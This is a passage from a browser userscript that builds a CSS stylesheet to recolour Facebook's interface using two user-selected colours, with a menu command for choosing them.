                  ".uiTypeaheadView .search .text {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  ".uiTypeaheadView .search .seeMore {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  ".uiBlingBox:hover {" +
                  "    background-color: #ECEFF5;" +
                  "    border-bottom: 1px solid #E5EAF1;" +
                  "}" +
                  ".menu_login_container .inputtext, .menu_login_container .inputpassword {" +
                  "    border-color: #1D2A5B;" +
                  "}" +
                  ".menu_login_container label {" +
                  "    color: #98A9CA;" +
                  "}" +
                  ".menu_login_container a, .menu_login_container a:hover {" +
                  "    color: #98A9CA;" +
                  "}" +
                  ".loggedout_menubar_container {" +
                  "    background-color: "+setup.colour1+";" +
                  "}" +
                  ".signup_bar_container {" +
                  "    background-color: #EDEFF4;" +
                  "    border-bottom: 1px solid #D8DFEA;" +
                  "}" +
                  ".signup_box {" +
                  "    color: #203360;" +
                  "}" +
                  ".LogoutPage_MobileMessageContainer {" +
                  "    color: #203360;" +
                  "}" +
                  ".registration #reg_box .inputtext, .registration #reg_box .inputpassword {" +
                  "    border-color: #BDC7D8;" +
                  "}" +
                  ".registration #reg_box .error_field input.inputtext, .registration #reg_box .error_field input.inputpassword {" +
                  "    border-color: #DD3C10;" +
                  "}" +
                  "#reg_pages_msg {" +
                  "    border-top: 1px solid #A0A9C0;" +
                  "}" +
                  ".registration #cancel_button {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  ".uiMediaThumbSelected {" +
                  "    background-color: "+setup.colour1+";" +
                  "    border-color: "+setup.colour1+";" +
                  "}" +
                  ".uiMediaThumb:hover, .uiMediaThumb:hover .uiMediaThumbWrap, .uiMediaThumb:active, .uiMediaThumb:active .uiMediaThumbWrap, .uiMediaThumb:focus, .uiMediaThumb:focus .uiMediaThumbWrap {" +
                  "    border-color: "+setup.colour1+";" +
                  "}" +
                  ".uiCollapsedFacepile .showAllLink {" +
                  "    border-color: #7792BA;" +
                  "}" +
                  ".WelcomePage_MainMessage {" +
                  "    color: #203360;" +
                  "}" +
                  ".WelcomePage_SignUpHeadline {" +
                  "    color: #203360;" +
                  "}" +
                  ".WelcomePage_SignUpSubheadline {" +
                  "    color: #203360;" +
                  "}" +
                  "#reg_box .label {" +
                  "    color: #1D2A5B;" +
                  "}" +
                  "#reg_box .inputtext, #reg_box .inputpassword {" +
                  "    border-color: #96A6C5;" +
                  "}" +
                  ".ff2 #reg_box select, .ff3 #reg_box select {" +
                  "    border-color: #96A6C5;" +
                  "}" +
                  "#openid_buttons_box {" +
                  "    background: none repeat scroll 0 0 #FFF9D7;" +
                  "    border: 1px solid #E2C822;" +
                  "}" +
                  "#captcha_response {" +
                  "    border: 1px solid #BDC7D8;" +
                  "}" +
                  "#reg_error, #captcha_error {" +
                  "    background: none repeat scroll 0 0 #FFEBE8;" +
                  "    border: 1px solid #DD3C10;" +
                  "}" +
                  "#reg_captcha h2 {" +
                  "    color: #1D2A5B;" +
                  "}" +
                  "#reg_captcha #cancel_button {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  ".actionspro .actionspro_li {" +
                  "    border-bottom: 1px solid #D8DFEA;" +
                  "}" +
                  ".actionspro .actionspro_a:hover {" +
                  "    background: none repeat scroll 0 0 "+setup.colour1+";" +
                  "}" +
                  ".link_menu .menu_content a:hover, .link_menu_list .menu_content ul li a.tab_link:hover {" +
                  "    background-color: #899BC1;" +
                  "}" +
                  ".dropdown_menu .menu_content {" +
                  "    border: 1px solid #6076A5;" +
                  "}" +
                  ".dropdown_menu a:hover {" +
                  "    background: none repeat scroll 0 0 #5C75AA;" +
                  "}" +
                  ".dropdown_head .dropdown_link.selected {" +
                  "    background: none repeat scroll 0 0 #5C75AA;" +
                  "    border-left: 1px solid "+setup.colour1+";" +
                  "    border-right: 1px solid "+setup.colour1+";" +
                  "    border-top: 1px solid "+setup.colour1+";" +
                  "}" +
                  ".profile .basic_info_summary {" +
                  "    border-right: 1px solid #D8DFEA;" +
                  "}" +
                  ".profile .box {" +
                  "    border-top: 1px solid #94A3C4;" +
                  "}" +
                  ".profile .box .box_header {" +
                  "    background: none repeat scroll 0 0 #ECEFF5;" +
                  "}" +
                  ".profile .box h4.box_header {" +
                  "    border-bottom: 1px solid #ECEFF5;" +
                  "}" +
                  ".profile .box_placeholder {" +
                  "    border: 3px dashed #93A4C6;" +
                  "}" +
                  ".profile .add_new_box_border .pop_content {" +
                  "    border-color: "+setup.colour1+" "+setup.colour1+" -moz-use-text-color;" +
                  "}" +
                  ".profile .add_new_box_border .border_frame {" +
                  "    border: 10px solid #868686;" +
                  "}" +
                  ".profile .add_new_box_border .dialog_buttons {" +
                  "    background: none repeat scroll 0 0 #F7F7F7;" +
                  "    border-color: #CCCCCC "+setup.colour1+" "+setup.colour1+";" +
                  "    border-right: 1px solid "+setup.colour1+";" +
                  "}" +
                  "#photos_box .added .album {" +
                  "    background: none repeat scroll 0 0 #FFF8CC;" +
                  "    border-bottom: 1px solid #FFE222;" +
                  "}" +
                  ".profile .profile_top_wash {" +
                  "    background: url(\"http://static.ak.fbcdn.net/rsrc.php/zb/r/3LyZkLVshsc.gif\") repeat-x scroll left bottom #EDEFF4;" +
                  "}" +
                  ".profile .top_bar .status_source a {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  ".profile .top_bar .mobile_status .clear_link a, .profile .top_bar .mobile_status .profile_empty_status a {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  ".profile .top_bar .mobile_status small a {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  ".profile .top_bar ul.tabs li {" +
                  "    background-color: #D8DFEA;" +
                  "}" +
                  ".profile .top_bar ul.tabs li a.tab_link {" +
                  "    border-color: #D8DFEA #D8DFEA -moz-use-text-color;" +
                  "}" +
                  ".profile .top_bar ul.tabs li a.tab_link:hover {" +
                  "    background-color: "+setup.colour2+";" +
                  "    border-color: "+setup.colour2+";" +
                  "}" +
                  ".profile .top_bar ul.tabs li.selected_menu_icon a.tab_link, .profile .top_bar ul.tabs li.add_tab a.tab_link:hover {" +
                  "    background-color: "+setup.colour2+";" +
                  "    border-color: "+setup.colour2+";" +
                  "}" +
                  ".profile .top_bar ul.tabs li.selected a.tab_link:hover {" +
                  "    border-color: #D8DFEA;" +
                  "}" +
                  ".profile .top_bar ul.tabs li.selected a.selected {" +
                  "    border-left: 1px solid #6076A5;" +
                  "}" +
                  ".profile .top_bar ul.tabs li.profile_tab_more a.tab_link:hover, .profile .top_bar ul.tabs li.selected_tab_more a.tab_link {" +
                  "    background: url(\"http://static.ak.fbcdn.net/rsrc.php/zS/r/UK_y4vNfbHf.gif\") no-repeat scroll 0 -26px #899BC1;" +
                  "    border-left: 1px solid "+setup.colour2+";" +
                  "    border-right: 1px solid "+setup.colour2+";" +
                  "    border-top: 1px solid "+setup.colour2+";" +
                  "}" +
                  ".profile_actions a.profile_action {" +
                  "    border-bottom: 1px solid #D8DFEA;" +
                  "}" +
                  ".profile_actions .holder {" +
                  "    border-bottom: 1px solid #D8DFEA;" +
                  "}" +
                  ".profile_actions a:hover {" +
                  "    background-color: "+setup.colour1+";" +
                  "}" +
                  "div.action a.remove:hover, div.action a.hover {" +
                  "    background: url(\"http://static.ak.fbcdn.net/rsrc.php/zV/r/5luk374gOfy.gif\") no-repeat scroll -12px center "+setup.colour1+";" +
                  "}" +
                  ".profile .blurb {" +
                  "    border: 1px solid #D8DFEA;" +
                  "}" +
                  ".profile .box_column {" +
                  "    border-bottom: 1px solid #94A3C4;" +
                  "    border-right: 1px solid #D8DFEA;" +
                  "}" +
                  ".profile .top_bar ul.tabs li.profile_tab_more .tabs_more_menu ul li a.tab_link:hover {" +
                  "    background-color: #899BC1;" +
                  "}" +
                  "a.UIIntentionalStory_Names {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  ".typeahead_search .suggestions_bottom_border {" +
                  "    border-bottom: 1px solid "+setup.colour1+";" +
                  "}" +
                  ".typeahead_search .typeahead_suggestions {" +
                  "    border-left: 1px solid #95A5C6;" +
                  "    border-right: 1px solid #95A5C6;" +
                  "}" +
                  ".typeahead_search .typeahead_selected img {" +
                  "    border: 1px solid #6E84B3;" +
                  "}" +
                  ".uiLightMorePager {" +
                  "    border-top: 1px solid #E5EAF1;" +
                  "}" +
                  ".uiLightMorePager:hover {" +
                  "    border-top: 1px solid #D8DFEA;" +
                  "}" +
                  ".uiMorePagerAnchor a.primary:hover {" +
                  "    background-color: #D8DFEA;" +
                  "}" +
                  ".uiMorePagerAnchor a.primaryLight:hover {" +
                  "    background-color: #EDEFF4;" +
                  "}" +
                  ".buddyListTypeahead .wrap {" +
                  "    border: 1px solid #BDC7D8;" +
                  "}" +
                  ".buddyListTypeahead .uiTypeaheadView li.selected {" +
                  "    background-color: #D8DFEA;" +
                  "    border-color: #D8DFEA;" +
                  "}" +
                  "#UIUpcoming_New {" +
                  "    background-color: #FFF7C5;" +
                  "}";
}

GM_registerMenuCommand("Customise facebook colours...", setColours);
addStyle(eval(GM_getValue("setup",'({colour1:"#3b5998", colour2:"#6d84b4"})')));